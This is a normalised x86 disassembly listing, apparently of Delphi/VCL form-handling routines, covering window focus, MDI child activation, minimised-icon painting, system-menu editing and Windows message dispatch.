mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call DefWindowProcA
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_41f528
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41f5fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f601
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x208 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x216 ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
mov eax [ ebp - 0x8 ]
call sub_41a7a4
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xffb5
call sub_44c24c
mov eax [ ebp - 0x4 ]
call sub_41f9c8
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov bx 0xffbc
call sub_44c24c
test al al
jne r-xdata
sub_41f608
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax [ ebp - 0x8 ]
call sub_430538
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x20c ]
mov eax [ ebp - 0x8 ]
call sub_430538
test al al
je r-xdata
mov esp ebp
pop ebp
retn
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41f528
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20c ] eax
sub_41f664
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x216 ]
mov [ ebp - 0x9 ] al
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41f528
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb0 ]
sub_41f69c
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
inc [ rw-data ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x238 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x58 ] edx
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x5c ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov edx [ ebp - 0x4 ]
call sub_43c728
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov ecx [ ebp - 0x4 ]
xor edx edx
call sub_43c550
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x60 ] edx
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x60 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
call sub_43c728
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov ecx [ ebp - 0x4 ]
xor edx edx
call sub_43c550
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x208 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x208 ] edx
jmp r-xdata
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov ax [ eax + 0x44 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x44 ] ax
xor eax eax
push ebp
push sub_41f999
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x8 ]
test [ eax + 0x44 ] 0x20
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x20c ] edx
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x6c ] edx
mov eax [ ebp - 0x4 ]
call sub_434714
mov dx 0xb000
call sub_41a288
test al al
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
call sub_434714
mov [ ebp - 0x10 ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov dx 0xb001
mov eax [ ebp - 0x10 ]
call sub_41a288
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f9a0
mov eax [ ebp - 0x8 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x44 ]
mov eax [ ebp - 0x8 ]
mov [ eax + 0x44 ] dx
retn
jmp r-xdata
call sub_44c848
jmp r-xdata
call sub_44c848
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov edx [ ebp - 0x8 ]
call sub_430538
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_434714
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20c ] eax
mov dx 0xb01b
mov eax [ ebp - 0x10 ]
call sub_41a288
test al al
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x24 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x20c ]
jne r-xdata
mov eax [ ebp - 0x8 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax [ ebp - 0x4 ]
call sub_42df28
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x264 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
call sub_44c848
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x20c ] edx
mov eax [ ebp - 0x14 ]
call sub_434714
mov dx 0xb01a
call sub_41a288
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
call sub_44c848
jmp r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
xor ecx ecx
mov edx 0xb02a
call sub_42df28
sub_41f9c8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x238 ] 0x0
jne r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax [ ebp - 0x8 ]
call sub_42df28
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_434714
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
call sub_434714
mov ebx eax
call GetFocus
cmp ebx eax
jne r-xdata
sub_41fa38
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x216 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x264 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
push 0x0
xor ecx ecx
mov cl [ ebp - 0x5 ]
mov edx 0xb02b
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
call sub_42df28
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_41fb30
mov eax [ ebp - 0x4 ]
call sub_41f9c8
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_434d48
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41f528
sub_41fac4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x216 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41e154
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
xor ecx ecx
mov edx 0xb004
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_42df28
mov eax [ ebp - 0x4 ]
call sub_41e154
mov edx [ ebp - 0x8 ]
call sub_41fac4
sub_41fb30
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x2cc ] 0x8
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0x217 ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_40bd7c
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_40bd44
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
sub_41fc14
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_434714
push eax
call SendMessageA
sub_41fc78
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax 0xb000
call sub_41fc14
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x272 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_41fcbc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x208 ]
mov eax 0xb001
call sub_41fc14
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_41fd00
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2a2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_41fd2c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
call sub_416770
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_42481c
mov [ ebp - 0x8 ] eax
sub_41fd60
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
call sub_40f8a4
xor eax eax
push ebp
push sub_41fe11
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
mov edx [ ebp - 0x8 ]
call sub_40fcf0
xor eax eax
push ebp
push sub_41fdee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x238 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xffb0
call sub_44c24c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fdf5
sub_41fe20
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x6 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_41e154
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_41e1a4
dec eax
test eax eax
jl r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x10 ]
mov bx 0xffd6
call sub_44c24c
mov [ ebp - 0x6 ] al
mov al [ ebp - 0x5 ]
and al [ ebp - 0x6 ]
jne r-xdata
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] 0x0
mov al [ ebp - 0x6 ]
pop ebx
mov esp ebp
pop ebp
retn
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_433588
mov [ ebp - 0x6 ] al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41e20c
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x14 ]
je r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x14 ]
mov bx 0xffd6
call sub_44c24c
or al [ ebp - 0x6 ]
mov [ ebp - 0x6 ] al
mov al [ ebp - 0x5 ]
and al [ ebp - 0x6 ]
jne r-xdata
sub_41fec8
push ebp
mov ebp esp
add esp 0xffffffb4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call IsIconic
test eax eax
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call BeginPaint
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_41fd2c
push eax
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
call DrawIcon
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call EndPaint
mov ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
or ax [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] ax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_431ce4
mov ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
not eax
and ax [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] ax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_41ff62
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0x130 ]
call sub_40f3c0
push eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_41ffd4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_432084
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_420018
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41fd2c
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
pop ecx
pop ecx
pop ebp
retn
sub_420038
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x211 ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x210 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x217 ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_434714
push eax
call GetSystemMenu
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x211 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x210 ] 0x2
jne r-xdata
push 0x0
push 0xf130
mov eax [ ebp - 0x4 ]
push eax
call DeleteMenu
push 0x400
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call DeleteMenu
push 0x400
push 0x5
mov eax [ ebp - 0x4 ]
push eax
call DeleteMenu
push 0x0
push 0xf030
mov eax [ ebp - 0x4 ]
push eax
call DeleteMenu
push 0x0
push 0xf020
mov eax [ ebp - 0x4 ]
push eax
call DeleteMenu
push 0x0
push 0xf000
mov eax [ ebp - 0x4 ]
push eax
call DeleteMenu
push 0x0
push 0xf120
mov eax [ ebp - 0x4 ]
push eax
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x210 ] 0x4
jne r-xdata
push 0x1
push 0xf020
mov eax [ ebp - 0x4 ]
push eax
call EnableMenuItem
push 0x1
push 0xf030
mov eax [ ebp - 0x4 ]
push eax
call EnableMenuItem
sub_420150
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x230 ]
mov eax [ ebp - 0x4 ]
call sub_41e66c
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
push ebp
call sub_420038
pop ecx
sub_42018c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x2
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42e538
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SetWindowPos
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
push 0xa2
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call PostMessageA
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x216 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_42d320
jmp r-xdata
sub_42023c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SendMessageA
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4334d0
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x1
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_434714
push eax
call SetMenu
xor edx edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
call sub_40b508
sub_4202b0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_431e68
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
call sub_40ae84
test al al
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_4202fc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
call sub_40aec0
sub_42032c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
call sub_40b890
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
jmp r-xdata
sub_42037c
push ebp
mov ebp esp
add esp 0xffffffe8
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42044f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420456
lea eax [ ebp - 0x18 ]
call sub_44cae0
retn
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x6 ] 0xffff
jne r-xdata
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x8 ]
movzx eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
test [ eax + 0x6 ] 0x10
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov cl [ ebp - 0x11 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x230 ]
call sub_40adb0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x11 ] 0x1
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetSubMenu
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4259d4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4c ]
call sub_42914c
mov edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_4259d4
jmp r-xdata
sub_42045c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x217 ] 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
setne dl
mov eax [ ebp - 0x4 ]
call sub_41fa38
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x10
je r-xdata
pop ecx
pop ecx
